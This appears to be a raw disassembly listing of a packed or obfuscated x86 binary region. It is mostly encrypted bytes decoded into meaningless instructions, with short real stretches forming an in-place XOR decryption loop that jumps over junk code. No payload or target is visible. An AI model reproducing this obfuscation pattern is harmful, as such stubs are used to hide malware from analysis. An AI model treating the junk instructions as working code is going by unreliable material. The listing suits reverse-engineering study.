  4046b8:	pop    ds
  4046b9:	cmp    al,0x56
  4046bb:	xor    BYTE PTR [esi+0x1a],bl
  4046be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046bf:	xchg   BYTE PTR [ebx+0x64],ch
  4046c2:	adc    al,0x47
  4046c4:	rcr    DWORD PTR ds:0x3351f77a,1
  4046ca:	icebp  
  4046cb:	sahf   
  4046cc:	add    DWORD PTR [ecx+edi*8-0x63c5af5a],edx
  4046d3:	lds    ebx,FWORD PTR [ecx-0x5cb0d8bc]
  4046d9:	mov    ebp,0x78fd815b
  4046de:	int3   
  4046df:	shl    BYTE PTR [edi],0x2f
  4046e2:	or     al,0x74
  4046e4:	jge    0x40474e
  4046e6:	in     al,dx
  4046e7:	jmp    DWORD PTR [eax-0x20]
  4046ea:	cmp    ebp,0x3c
  4046ed:	mov    esi,0x3b6c6719
  4046f2:	(bad)  
  4046f3:	mov    bl,0x39
  4046f5:	div    edx
  4046f7:	imul   eax,DWORD PTR [ebp+0x783b8946],0x8b621397
  404701:	inc    ebp
  404702:	ror    BYTE PTR [ebx-0x53f02bb3],1
  404708:	enter  0xc102,0xe9
  40470c:	add    cl,BYTE PTR [ebx+0x558bd04d]
  404712:	aam    0x33
  404714:	mov    ecx,0xd2331ee1
  40471a:	or     eax,edx
  40471c:	lea    eax,[ebp+eax*1-0x4]
  404720:	mov    DWORD PTR [ebp-0x34],eax
  404723:	mov    eax,DWORD PTR [ebp-0x30]
  404726:	mov    ecx,DWORD PTR [ebp-0x2c]
  404729:	shrd   eax,ecx,0x2
  40472d:	shr    ecx,0x2
  404730:	mov    ecx,DWORD PTR [ebp-0x30]
  404733:	mov    edx,DWORD PTR [ebp-0x2c]
  404736:	shl    ecx,0x1e
  404739:	mov    ecx,DWORD PTR [ebp-0x14]
  40473c:	xor    eax,edi
  40473e:	xor    edx,edx
  404740:	or     eax,edx
  404742:	mov    cl,BYTE PTR [eax+ecx*1]
  404745:	mov    eax,DWORD PTR [ebp-0x34]
  404748:	xor    BYTE PTR [eax],cl
  40474a:	mov    eax,DWORD PTR [ebp-0x20]
  40474d:	mov    ecx,DWORD PTR [ebp-0x1c]
  404750:	shrd   eax,ecx,0x2
  404754:	shr    ecx,0x2
  404757:	mov    ecx,DWORD PTR [ebp-0x20]
  40475a:	mov    edx,DWORD PTR [ebp-0x1c]
  40475d:	xor    eax,edi
  40475f:	jmp    0x404b00
  404764:	xchg   esp,eax
  404765:	mov    esi,DWORD PTR [esi-0x434b497e]
  40476b:	fwait
  40476c:	or     al,dl
  40476e:	cli    
  40476f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404770:	dec    ecx
  404771:	jecxz  0x4047c1
  404773:	sahf   
  404774:	mov    esi,0xbdbebe03
  404779:	les    edi,FWORD PTR [esi+0x56228be]
  40477f:	mov    DWORD PTR [ebx+0x571445fd],esi
  404785:	fcom   QWORD PTR [ebx]
  404787:	dec    ecx
  404788:	int3   
  404789:	inc    eax
  40478a:	cmp    DWORD PTR [eax-0xb74169b],edx
  404790:	rol    BYTE PTR [ebx],1
  404792:	stc    
  404793:	ins    DWORD PTR es:[edi],dx
  404794:	mov    gs,WORD PTR [ebx+0x5a52a0ca]
  40479a:	inc    esp
  40479b:	add    eax,0xb2e63e05
  4047a0:	dec    ebp
  4047a1:	sbb    eax,0xc9c9ea98
  4047a6:	stc    
  4047a7:	xor    DWORD PTR [eax-0x1e],eax
  4047aa:	out    dx,eax
  4047ab:	ja     0x4047c8
  4047ad:	ja     0x404764
  4047af:	in     al,0x65
  4047b1:	jnp    0x404800
  4047b3:	cmp    al,0x2b
  4047b5:	gs push esp
  4047b7:	or     eax,0xdecf1782
  4047bc:	push   ebx
  4047bd:	push   ds
  4047be:	xchg   ecx,eax
  4047bf:	mov    cl,0xc8
  4047c1:	mov    dl,BYTE PTR [eax]
  4047c3:	and    DWORD PTR [ecx+0x6d37f3f5],ebp
  4047c9:	dec    eax
  4047ca:	aas    
  4047cb:	retf   0xb330
  4047ce:	repz push ebp
  4047d0:	fdivr  QWORD PTR [ebp+0x5286ec0f]
  4047d6:	jo     0x4047b4
  4047d8:	call   0x79552771
  4047dd:	lods   eax,DWORD PTR ds:[esi]
  4047de:	(bad)  
  4047df:	leave  
  4047e0:	ds mov ebx,0x8fb57d1c
  4047e6:	ins    BYTE PTR es:[edi],dx
  4047e7:	in     eax,dx
  4047e8:	mov    eax,DWORD PTR [ebx]
  4047ea:	dec    eax
  4047eb:	call   0x45eb:0x28f40cc7
  4047f2:	sbb    al,0x56
  4047f4:	aad    0xab
  4047f6:	test   BYTE PTR [ecx],ch
  4047f8:	cmc    
  4047f9:	pop    ebx
  4047fa:	push   ebp
  4047fb:	xor    al,0x97
  4047fd:	pop    edx
  4047fe:	cmp    ecx,DWORD PTR [eax+0x52d88a01]
  404804:	add    eax,0x35307f4a
  404809:	ret    0xc826
  40480c:	mov    eax,0xa602f441
  404811:	push   0x5f20f0e7
  404816:	nop
  404817:	outs   dx,DWORD PTR ds:[esi]
  404818:	dec    ecx
  404819:	pusha  
  40481a:	and    bl,BYTE PTR [esi+0x653169f9]
  404820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404821:	inc    eax
  404822:	inc    esp
  404823:	or     al,0x26
  404825:	xor    al,0xb7
  404827:	fucomi st,st(0)
  404829:	fisttp QWORD PTR [ebx]
  40482b:	addr16 loop 0x404875
  40482e:	dec    eax
  40482f:	call   0xf3f5:0xfa30f687
  404836:	cli    
  404837:	sbb    eax,0x5493842d
  40483c:	sbb    eax,ecx
  40483e:	push   cs
  40483f:	js     0x4047de
  404841:	cmp    al,0xab
  404843:	imul   ebp,DWORD PTR [edx+edx*2],0x1a
  404847:	dec    ebp
  404848:	push   esp
  404849:	loopne 0x4048b5
  40484b:	ss aas 
  40484d:	shr    esp,0xba
  404850:	xchg   BYTE PTR [edx-0x526a55f1],ch
  404856:	xor    DWORD PTR [eax],esp
  404858:	mov    ebx,0xfdec347
  40485d:	add    edx,DWORD PTR [ecx]
  40485f:	jmp    0xfa58:0x8265981
  404866:	mov    ch,0xd5
  404868:	xor    BYTE PTR [edx+0x11d49a5d],ch
  40486e:	ret    0x1229
  404871:	jo     0x4048b0
  404873:	cmp    BYTE PTR [bp+di+0x5e74],0xc9
  404879:	test   eax,0x5cdfb1e0
  40487e:	inc    esi
  40487f:	add    al,0x95
  404881:	and    edx,ebx
  404883:	mov    al,ds:0x192160ef
  404888:	pop    edi
  404889:	daa    
  40488a:	push   es
  40488b:	fcos   
  40488d:	and    ch,bh
  40488f:	ret    
  404890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404891:	dec    ebx
  404893:	mov    edi,0xfa1a3392
  404898:	mov    al,ds:0xf0a30e54
  40489d:	cmp    BYTE PTR [ecx+0x6e439d01],ch
  4048a3:	mov    eax,0x6b80f3cb
  4048a8:	mov    ecx,0x5db5d172
  4048ad:	repz jge 0x404840
  4048b0:	mov    ebx,DWORD PTR [esi-0x2a4eaacf]
  4048b6:	xchg   ebx,eax
  4048b7:	shr    ch,cl
  4048b9:	sbb    cl,BYTE PTR [edi]
  4048bb:	and    BYTE PTR [esi+edx*8],ah
  4048be:	xchg   edi,eax
  4048bf:	sbb    al,0x6d
  4048c1:	clc    
  4048c2:	aas    
  4048c3:	adc    eax,0x7346e0c0
  4048c8:	shr    DWORD PTR [ebx-0x22e31777],1
  4048ce:	jp     0x404850
  4048d0:	jecxz  0x404917
  4048d2:	cmp    BYTE PTR [eax+ecx*2],cl
  4048d5:	jp     0x404937
  4048d7:	jmp    0xa0db:0xda7296ab
  4048de:	(bad)  
  4048df:	gs in  al,0xad
  4048e2:	or     bh,ch
  4048e4:	mov    ebx,0x875e6282
  4048e9:	mov    al,ds:0xaa57980d
  4048ee:	repnz pop edx
  4048f0:	sub    bl,BYTE PTR [esp+ebp*1-0x46]
  4048f4:	mov    ebp,0xc3452cb7
  4048f9:	adc    edx,DWORD PTR [esi+edi*4+0x35234ac]
  404900:	jne    0x4048a4
  404902:	xor    DWORD PTR [edi-0x34984ce3],esi
  404908:	sbb    DWORD PTR [edi],ecx
  40490a:	vaddsd xmm0,xmm6,QWORD PTR [esi+eiz*2-0x1caf8edd]
  404913:	rcr    DWORD PTR [ecx-0x51],cl
  404916:	mov    edi,0x57c955d2
  40491b:	cmp    DWORD PTR ds:0xb1182bc7,edi
  404921:	push   cs
  404922:	sub    DWORD PTR [esi-0x11727e23],eax
  404928:	(bad)  
  404929:	xchg   edi,eax
  40492a:	cvtps2pd xmm2,QWORD PTR [edi+ebx*8]
  40492e:	daa    
  40492f:	jg     0x4048ea
  404931:	dec    esi
  404932:	and    ebp,DWORD PTR [eax-0x6b]
  404935:	fnstenv [ebx-0x7e]
  404938:	lds    edi,FWORD PTR ds:0x871967d6
  40493e:	out    dx,eax
  40493f:	push   cs
  404940:	call   0x6843ff2d
  404945:	push   edi
  404946:	sbb    ch,ah
  404948:	xor    BYTE PTR [edx+0x3301e28e],cl
  40494e:	mov    ds:0xfbd5e514,eax
  404953:	enter  0xedcd,0x7b
  404957:	xlat   BYTE PTR ds:[ebx]
  404958:	icebp  
  404959:	repz xchg ecx,eax
  40495b:	xchg   DWORD PTR [eax],ebp
  40495d:	mov    al,ds:0xfa8105ee
  404962:	dec    edx
  404963:	xchg   edx,eax
  404964:	clc    
  404965:	dec    ebp
  404966:	std    
  404967:	jl     0x4049a9
  404969:	cmc    
  40496a:	pop    ebp
  40496b:	add    edi,DWORD PTR [ebp-0x72]
  40496e:	xor    al,0x9c
  404970:	mov    edi,0xd2bcd97b
  404975:	xlat   BYTE PTR ds:[ebx]
  404976:	or     al,0x11
  404978:	imul   ebp,DWORD PTR [edx-0x653b8aae],0x27572641
  404982:	fdivp  st(0),st
  404984:	pop    es
  404985:	(bad)  
  404987:	rol    DWORD PTR [esi-0x13cb88f9],0xe8
  40498e:	aaa    
  40498f:	aam    0x11
  404991:	dec    ecx
  404992:	xchg   edx,eax
  404993:	(bad)  
  404994:	pusha  
  404995:	inc    ebx
  404996:	test   eax,0x4ff00c6e
  40499b:	loop   0x40494c
  40499d:	fmul   QWORD PTR [ebp-0x63]
  4049a0:	imul   esp,DWORD PTR [eax],0x3801eb7f
  4049a6:	stos   BYTE PTR es:[edi],al
  4049a7:	pop    ebx
  4049a9:	ins    DWORD PTR es:[edi],dx
  4049aa:	neg    BYTE PTR ds:0x6c56059
  4049b0:	mov    ecx,0x7a6c32a6
  4049b5:	cmp    eax,0x2a5092cd
  4049ba:	or     DWORD PTR [eax+0x194f7660],ebp
  4049c0:	out    0x3f,al
  4049c2:	bound  ecx,QWORD PTR [edi+edx*2+0x46e42060]
  4049c9:	cwde   
  4049ca:	neg    BYTE PTR [esi-0x1e00bd4d]
  4049d0:	add    ebx,DWORD PTR [eax+0x38]
  4049d3:	cmp    al,0x9b
  4049d5:	das    
  4049d6:	lds    ebp,FWORD PTR [edx+0x1]
  4049d9:	jmp    0x2e26:0xeab9c0e8
  4049e0:	sti    
  4049e1:	jecxz  0x404a44
  4049e3:	mov    ds:0x76bf1c9f,eax
  4049e8:	pusha  
  4049e9:	shr    BYTE PTR [esi+0x7e],0x62
  4049ed:	js     0x404a0d
  4049ef:	add    DWORD PTR [esi+0x59],esp
  4049f2:	dec    esp
  4049f3:	dec    esp
  4049f4:	fld    QWORD PTR [ebx+ebp*4+0x2d33429c]
  4049fb:	fist   DWORD PTR [edi+0x3a]
  4049fe:	fist   DWORD PTR [ebx]
  404a00:	sbb    BYTE PTR [eax+edx*8+0x3c],al
  404a04:	push   esp
  404a05:	xchg   esi,eax
  404a06:	cmp    al,BYTE PTR [eax+0x20]
  404a09:	cli    
  404a0a:	bound  ecx,QWORD PTR [esi-0x307d0acb]
  404a10:	xor    BYTE PTR [ebx+0x46334363],bl
  404a16:	imul   ecx,DWORD PTR [edi-0x4ce44a0e],0xffffffba
  404a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a1e:	and    cl,bh
  404a20:	add    eax,0x60c3963c
  404a25:	cmp    BYTE PTR [ecx],0x1d
  404a28:	xor    cl,bl
  404a2a:	retf   
  404a2b:	clc    
  404a2c:	jg     0x4049f5
  404a2e:	dec    ebx
  404a2f:	sbb    al,0x1
  404a31:	push   es
  404a32:	mov    al,ds:0x9773a5f9
  404a37:	or     DWORD PTR ds:0x67283dd5,0x6715f7c6
  404a41:	out    dx,eax
  404a42:	icebp  
  404a43:	aas    
  404a44:	(bad)  
  404a45:	or     DWORD PTR fs:[ecx],edx
  404a48:	scas   al,BYTE PTR es:[edi]
  404a49:	enter  0xaf9d,0x91
  404a4d:	xor    eax,0x468e5a44
  404a52:	mov    DWORD PTR [eax-0x3d],esi
  404a55:	cwde   
  404a56:	rcl    BYTE PTR [ebx+0x15],0x1
  404a5a:	shl    DWORD PTR [edi-0x7dc1403e],cl
  404a60:	sahf   
  404a61:	iret   
  404a62:	and    DWORD PTR [ebx-0x42b253c7],esi
  404a68:	int3   
  404a69:	mov    cl,0xa3
  404a6b:	dec    eax
  404a6c:	pop    ebp
  404a6d:	mov    eax,0x5aa01839
  404a72:	lock mov edi,0xefb03d4b
  404a78:	cmp    BYTE PTR [edx-0x151872c6],bl
  404a7e:	es ficom WORD PTR ds:0xd29fb946
  404a86:	scas   eax,DWORD PTR es:[edi]
  404a87:	mov    ds:0x7cc8fb7c,al
  404a8c:	into   
  404a8d:	and    al,BYTE PTR [esp+ebx*8+0x3cd7d3ff]
  404a94:	xor    eax,0x7286d679
  404a99:	push   0x83ddce73
  404a9e:	outs   dx,DWORD PTR ds:[esi]
  404a9f:	mov    ebx,0x64bccc22
  404aa4:	pop    ebx
  404aa5:	jl     0x404ac2
  404aa7:	scas   al,BYTE PTR es:[edi]
  404aa8:	pop    eax
  404aa9:	sub    ah,BYTE PTR [ebx+0x55]
  404aac:	add    al,0x49
  404aae:	or     bh,ch
  404ab0:	jl     0x404b01
  404ab2:	jp     0x404a89
  404ab4:	jae    0x404a69
  404ab6:	fldcw  WORD PTR [esi+0x44055a20]
  404abc:	mov    eax,0x33277dd
  404ac1:	cli    
  404ac2:	lods   al,BYTE PTR es:[esi]
  404ac4:	jb     0x404b1f
  404ac6:	aad    0xe8
  404ac8:	pop    ss
  404ac9:	cdq    
  404aca:	pop    esp
  404acb:	pop    ds
  404acc:	xchg   ecx,eax
  404acd:	mov    eax,ds:0x2e922f45
  404ad2:	push   ss
  404ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ad4:	or     esp,DWORD PTR [eax+0x639ed4c4]
  404ada:	mov    eax,0x6b78c0ea
  404adf:	or     cl,BYTE PTR [esi+ebx*4-0x68]
  404ae3:	xor    esp,DWORD PTR [ebp-0x64bad76b]
  404ae9:	out    0xa,al
  404aeb:	cmc    
  404aec:	scas   eax,DWORD PTR es:[edi]
  404aed:	sub    dl,BYTE PTR [ebp+0x7dab38d3]
  404af3:	es loopne 0x404b75
  404af6:	push   esp
  404af7:	in     eax,dx
  404af8:	sti    
  404af9:	es mov bh,0x19
  404afc:	mov    al,ds:0xc1bba51b
  404b01:	loope  0x404b21
  404b03:	xor    edx,edx
  404b05:	or     eax,edx
  404b07:	lea    eax,[ebp+eax*1-0x4]
  404b0b:	mov    DWORD PTR [ebp-0x34],eax
  404b0e:	mov    eax,DWORD PTR [ebp-0x20]
  404b11:	mov    ecx,DWORD PTR [ebp-0x1c]
  404b14:	shrd   eax,ecx,0x2
  404b18:	shr    ecx,0x2
  404b1b:	mov    ecx,DWORD PTR [ebp-0x20]
  404b1e:	mov    edx,DWORD PTR [ebp-0x1c]
  404b21:	shl    ecx,0x1e
  404b24:	mov    ecx,DWORD PTR [ebp-0x14]
  404b27:	jmp    0x404ec8
  404b2c:	cmp    BYTE PTR [edx],ch
  404b2e:	push   0xffffff83
  404b30:	jl     0x404ab5
  404b32:	cmp    BYTE PTR [edx-0x61edfbc6],bh
  404b38:	rcl    BYTE PTR [ebx+0x9bd9e12],1
  404b3e:	mov    esi,0xbec4bdbe
  404b43:	mov    esi,0x8b1c23cf
  404b48:	shr    al,1
  404b4a:	push   eax
  404b4b:	mov    bl,0xa6
  404b4d:	shl    DWORD PTR [ecx-0x777a2fed],1
  404b53:	cdq    
  404b54:	sub    DWORD PTR [ebx+0x42],ebp
  404b57:	into   
  404b58:	xchg   edi,eax
  404b59:	ds jle 0x404b5a
  404b5c:	test   ch,bl
  404b5e:	sti    
  404b5f:	ret    0x2a5f
  404b62:	lahf   
  404b63:	jmp    0xccfa:0x699beff9
  404b6a:	mov    ch,0x2e
  404b6c:	adc    DWORD PTR [edi-0x76],esp
  404b6f:	jae    0x404b9f
  404b71:	inc    eax
  404b72:	and    eax,0x15465a32
  404b77:	arpl   WORD PTR [esi+0x5a1e0ae7],bx
  404b7d:	dec    esp
  404b7e:	fdivr  st(6),st
  404b80:	mov    WORD PTR [ebp-0x5226db55],gs
  404b86:	ins    DWORD PTR es:[edi],dx
  404b87:	je     0x404b57
  404b89:	jmp    0x7cbb:0x9105c1c3
  404b90:	(bad)  
  404b91:	add    edi,DWORD PTR [edx]
  404b93:	push   edx
  404b94:	mov    BYTE PTR [ebx],bh
  404b96:	ds out 0xfd,eax
  404b99:	mov    ah,0x33
  404b9b:	jae    0x404b38
  404b9d:	loopne 0x404b85
  404b9f:	pop    ebx
  404ba0:	mov    eax,0x95ecfbd7
  404ba5:	test   DWORD PTR [edx],edi
  404ba7:	mov    eax,0xaeb02e0a
  404bac:	and    ch,dl
  404bae:	cdq    
  404baf:	dec    edx
  404bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bb1:	ds (bad) 
  404bb3:	(bad)  
  404bb5:	jnp    0x404bb7
  404bb7:	and    DWORD PTR [eax-0x28],ebx
  404bba:	nop
  404bbb:	xlat   BYTE PTR ds:[ebx]
  404bbc:	lds    edi,FWORD PTR [edi]
  404bbe:	in     al,0x39
  404bc0:	jns    0x404be0
  404bc2:	enter  0xae1e,0x9
  404bc6:	mov    BYTE PTR [ebp+ebp*4-0x17],dh
  404bca:	lahf   
  404bcb:	ins    BYTE PTR es:[edi],dx
  404bcc:	push   ebp
  404bcd:	fild   WORD PTR [ebp+0x17]
  404bd0:	nop
  404bd1:	push   es
  404bd2:	aam    0xee
  404bd4:	sub    ebx,esp
  404bd6:	mov    ds:0xcdcc6328,al
  404bdb:	iret   
  404bdc:	stc    
  404bdd:	sti    
  404bde:	sub    al,0x8d
  404be0:	add    ebp,ecx
  404be2:	mov    dh,0xc5
  404be4:	sbb    ah,dh
  404be6:	loopne 0x404bb0
  404be8:	mov    BYTE PTR [eax-0x6d],dh
  404beb:	test   al,0x52
  404bed:	add    BYTE PTR [edi],ch
  404bef:	je     0x404c35
  404bf1:	xchg   ebx,eax
  404bf2:	das    
  404bf3:	inc    ecx
  404bf4:	clc    
  404bf5:	and    ch,BYTE PTR [eax]
  404bf7:	jns    0x404c48
  404bf9:	and    edi,DWORD PTR [ecx+0x51]
  404bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bfd:	mov    cl,0x8b
  404bff:	push   eax
  404c00:	dec    esp
  404c01:	sti    
  404c02:	jmp    0x8fd4:0x554872ec
  404c09:	push   edi
  404c0a:	jnp    0x404be7
  404c0c:	icebp  
  404c0d:	sub    esi,0xffffffdf
  404c10:	fldcw  WORD PTR ds:0x53e13283
  404c16:	jle    0x404c3b
  404c18:	loopne 0x404bbd
  404c1a:	mov    ss,WORD PTR [ebp+0x3e]
  404c1d:	fwait
  404c1e:	add    al,0xd9
  404c20:	out    0x64,eax
  404c22:	jecxz  0x404be9
  404c24:	xchg   edi,eax
  404c25:	outs   dx,DWORD PTR ds:[esi]
  404c26:	inc    BYTE PTR cs:[esi-0x4a]
  404c2a:	and    DWORD PTR [esi+ecx*2+0x16603518],eax
  404c31:	push   cs
  404c32:	int3   
  404c33:	push   ds
  404c34:	int    0x14
  404c36:	(bad)  
  404c37:	sbb    ebp,DWORD PTR [ecx-0x2ba57068]
  404c3d:	ret    
  404c3e:	sti    
  404c3f:	adc    DWORD PTR [edx+0x29],esi
  404c42:	mov    ?,WORD PTR [eax+0x7b53961b]
  404c48:	shr    al,0x3
  404c4b:	xor    al,0xc1
  404c4d:	inc    ebp
  404c4e:	repnz sahf 
  404c50:	xor    BYTE PTR [ebx],al
  404c52:	push   es
  404c53:	xchg   edx,eax
  404c54:	fdiv   QWORD PTR [ebx+0x24c75722]
  404c5a:	int3   
  404c5b:	sub    eax,eax
  404c5d:	push   edi
  404c5e:	cwde   
  404c5f:	cmp    eax,0xfe0f6bb2
  404c64:	loope  0x404c36
  404c66:	arpl   WORD PTR [ebp+0x6c],bx
  404c69:	in     eax,dx
  404c6a:	neg    dh
  404c6c:	in     eax,dx
  404c6d:	dec    ebx
  404c6e:	rcl    BYTE PTR [ebp-0x66],0x98
  404c72:	inc    edi
  404c73:	jp     0x404bfe
  404c75:	cli    
  404c76:	sbb    BYTE PTR [edx],ch
  404c78:	jp     0x404c44
  404c7a:	fidivr WORD PTR [edi]
  404c7c:	fist   DWORD PTR [esi+0x2c]
  404c7f:	les    edi,FWORD PTR [bp+si+0x49]
  404c83:	shl    WORD PTR [eax+0x5988eed1],0x39
  404c8b:	sti    
  404c8c:	loop   0x404c3a
  404c8e:	mov    esi,0x6d1f9452
  404c93:	xchg   esp,eax
  404c94:	sbb    DWORD PTR [eax-0x69],edx
  404c97:	sub    al,0xa6
  404c99:	xor    BYTE PTR [ecx+0x1],ch
  404c9c:	mov    edi,0xca500250
  404ca1:	outs   dx,BYTE PTR ds:[esi]
  404ca2:	xchg   ecx,eax
  404ca3:	out    0x9b,eax
  404ca5:	fbld   TBYTE PTR [edi-0x4]
  404ca8:	leave  
  404ca9:	dec    esp
  404caa:	add    dh,bh
  404cac:	outs   dx,DWORD PTR ds:[esi]
  404cad:	xchg   ecx,eax
  404cae:	shl    BYTE PTR [esi-0x600d3a5c],cl
  404cb4:	mov    al,ds:0x63a51c6f
  404cb9:	mov    edx,0x8b5231b2
  404cbe:	test   al,0x86
  404cc0:	frstor [ebp+0x2]
  404cc3:	mov    bh,0x6
  404cc5:	into   
  404cc6:	push   edi
  404cc7:	mov    eax,ds:0x8f68f51
  404ccc:	jmp    0x7610:0x8f400101
  404cd3:	ds ja  0x404d31
  404cd6:	ficomp WORD PTR [esi+eiz*8]
  404cd9:	mov    esi,0x302475c9
  404cde:	xor    BYTE PTR ds:0xf907487,dh
  404ce4:	push   ebx
  404ce5:	and    ecx,DWORD PTR [ebx+0x11]
  404ce8:	int3   
  404ce9:	pop    eax
  404cea:	adc    DWORD PTR [esi],eax
  404cec:	js     0x404c7f
  404cee:	push   es
  404cef:	adc    DWORD PTR [eax+edx*4],eax
  404cf2:	into   
  404cf3:	push   eax
  404cf4:	imul   ebp,DWORD PTR [esi+esi*8+0x62c0583d],0x26
  404cfc:	jns    0x404c95
  404cfe:	and    DWORD PTR [ecx+0x214ea4e6],0xffffffe8
  404d05:	div    ecx
  404d07:	in     eax,dx
  404d08:	out    0xc1,al
  404d0a:	faddp  st(3),st
  404d0c:	xchg   edi,eax
  404d0d:	push   ds
  404d0e:	mov    edx,0x567f428a
  404d13:	or     eax,0xaa611888
  404d18:	or     BYTE PTR [edx+ebp*2+0x7583b321],dl
  404d1f:	jo     0x404cc2
  404d21:	ins    BYTE PTR es:[edi],dx
  404d22:	inc    edx
  404d23:	(bad)  
  404d24:	jg     0x404d35
  404d26:	push   esi
  404d27:	popf   
  404d28:	push   es
  404d29:	and    DWORD PTR [ecx+0x922a6e8],ebp
  404d2f:	push   es
  404d30:	iret   
  404d31:	popf   
  404d32:	fnstsw WORD PTR [edx-0x22]
  404d35:	stc    
  404d36:	sub    bh,BYTE PTR [esi-0x29]
  404d39:	inc    ebp
  404d3a:	sub    DWORD PTR [ebx-0x2e631a22],ebx
  404d40:	int3   
  404d41:	aas    
  404d42:	jecxz  0x404d5c
  404d44:	mov    dl,0x8
  404d46:	or     BYTE PTR [ecx+0x41],bl
  404d49:	xchg   esi,eax
  404d4a:	fmul   QWORD PTR [ebx+0x34e1b097]
  404d50:	push   cs
  404d51:	adc    eax,0x32753554
  404d56:	add    DWORD PTR [ecx],0xffffffa5
  404d59:	test   ch,al
  404d5b:	pop    es
  404d5c:	jge    0x404dd6
  404d5e:	push   ebp
  404d5f:	mov    bl,0x54
  404d61:	jmp    0x404ce5
  404d63:	cli    
  404d64:	fld    TBYTE PTR [esi]
  404d66:	aam    0x7e
  404d68:	or     al,0x67
  404d6a:	xor    DWORD PTR [esi],ecx
  404d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d6d:	aad    0x13
  404d6f:	lods   eax,DWORD PTR ds:[esi]
  404d70:	dec    ebx
  404d71:	sub    DWORD PTR [ebx-0x7b],ecx
  404d74:	lods   al,BYTE PTR ds:[esi]
  404d75:	mov    dl,0x1d
  404d77:	stc    
  404d78:	retf   
  404d79:	mov    ebx,0x6b055900
  404d7e:	pop    ss
  404d7f:	inc    esi
  404d80:	dec    edx
  404d81:	xlat   BYTE PTR ds:[ebx]
  404d82:	sub    ebx,DWORD PTR [edi+eax*8-0x542aa043]
  404d89:	(bad)  
  404d8a:	and    bh,al
  404d8c:	pop    DWORD PTR [edi+0x38f43741]
  404d92:	mov    al,0xb0
  404d94:	jb     0x404d2c
  404d96:	push   eax
  404d97:	in     eax,0xeb
  404d99:	xchg   ecx,eax
  404d9a:	dec    edi
  404d9b:	lea    ebp,[eax+0x19]
  404d9e:	cmp    BYTE PTR [edx-0x3b23ff6b],ah
  404da4:	and    DWORD PTR [esi],ebp
  404da6:	push   ebp
  404da7:	pusha  
  404da8:	xchg   esi,eax
  404da9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404daa:	mov    dl,0x27
  404dac:	in     al,0xa6
  404dae:	aad    0x9d
  404db0:	aam    0x27
  404db2:	xor    ecx,DWORD PTR [ebx-0x78]
  404db5:	mov    esp,0x12564345
  404dba:	enter  0x105f,0xcf
  404dbe:	jbe    0x404df6
  404dc0:	sbb    edx,esp
  404dc2:	je     0x404dfd
  404dc4:	sbb    eax,0x28682970
  404dc9:	mov    dl,0xc8
  404dcb:	outs   dx,BYTE PTR ds:[esi]
  404dcc:	jnp    0x404dc3
  404dce:	dec    eax
  404dcf:	fiadd  DWORD PTR [ecx+0x78dd942a]
  404dd5:	adc    ah,ch
  404dd7:	xchg   ebx,eax
  404dd8:	call   0xc7b65ab4
  404ddd:	das    
  404dde:	lock rcl DWORD PTR [esi],1
  404de1:	fstp   TBYTE PTR [esi-0x64]
  404de4:	dec    ebp
  404de5:	xchg   BYTE PTR [edi],al
  404de7:	lods   al,BYTE PTR ds:[esi]
  404de8:	sub    ch,BYTE PTR [ebp-0x3]
  404deb:	sbb    eax,DWORD PTR [eax]
  404ded:	inc    ebp
  404dee:	es jne 0x404e5c
  404df1:	mov    eax,ds:0xd9280fdc
  404df6:	cld    
  404df7:	hlt    
  404df8:	dec    ebx
  404df9:	xor    eax,DWORD PTR [ebp+0x8]
  404dfc:	loop   0x404e7b
  404dfe:	adc    al,0x58
  404e00:	rol    edx,cl
  404e02:	imul   esp,DWORD PTR [edx-0x1],0x5a
  404e06:	or     DWORD PTR [ecx+0x3a],ecx
  404e09:	lahf   
  404e0a:	sbb    BYTE PTR [ebx],0x53
  404e0d:	sub    DWORD PTR ds:0xfccb47fc,0xda474418
  404e17:	jne    0x404e72
  404e19:	nop
  404e1a:	push   es
  404e1b:	pop    ebx
  404e1c:	pop    ebx
  404e1d:	adc    al,0x6e
  404e1f:	add    edx,edi
  404e21:	mov    eax,0x5764ee17
  404e26:	test   eax,0x2e824c50
  404e2b:	mov    al,ds:0x3a205492
  404e30:	cli    
  404e31:	popf   
  404e32:	or     bl,BYTE PTR [esi+0x45]
  404e35:	cwde   
  404e36:	push   ds
  404e37:	add    al,bl
  404e39:	les    esp,FWORD PTR ss:[ecx-0x78ad27b8]
  404e40:	lds    ecx,FWORD PTR [eax]
  404e42:	sbb    esi,ecx
  404e44:	je     0x404dc9
  404e46:	pop    ecx
  404e47:	inc    ebp
  404e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e49:	sub    eax,esi
  404e4b:	dec    edi
  404e4c:	adc    al,bl
  404e4e:	into   
  404e4f:	jb     0x404e2a
  404e51:	push   eax
  404e52:	cwde   
  404e53:	mov    esp,0xe74dead9
  404e58:	out    0xc6,al
  404e5a:	rcr    DWORD PTR [ecx*4-0x1894f357],cl
  404e61:	adc    al,0x37
  404e63:	xchg   BYTE PTR [eax-0x40],dl
  404e66:	jg     0x404e90
  404e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e69:	jle    0x404ebb
  404e6b:	inc    ebp
  404e6c:	mov    dl,0x4c
  404e6e:	mov    eax,ds:0xbcb2576d
  404e73:	and    BYTE PTR [ebp-0x39],0xdb
  404e77:	mov    WORD PTR [esi-0x11672291],cs
  404e7d:	add    al,0x35
  404e7f:	inc    eax
  404e80:	rcl    DWORD PTR [ecx-0x48],1
  404e83:	push   edi
  404e84:	(bad)  [edi]
  404e86:	stc    
  404e87:	sbb    al,BYTE PTR [esi+0x3a65a965]
  404e8d:	jmp    0x985bbcf7
  404e92:	mov    ebp,0x56dbfc5
  404e97:	out    0x9a,eax
  404e99:	test   al,ah
  404e9b:	cmp    edx,ebx
  404e9d:	clc    
  404e9e:	adc    al,0x4
  404ea0:	mov    ecx,0x3e66beaa
  404ea5:	(bad)  
  404ea6:	leave  
  404ea7:	fst    DWORD PTR [edx+edx*1]
  404eaa:	jnp    0x404e8d
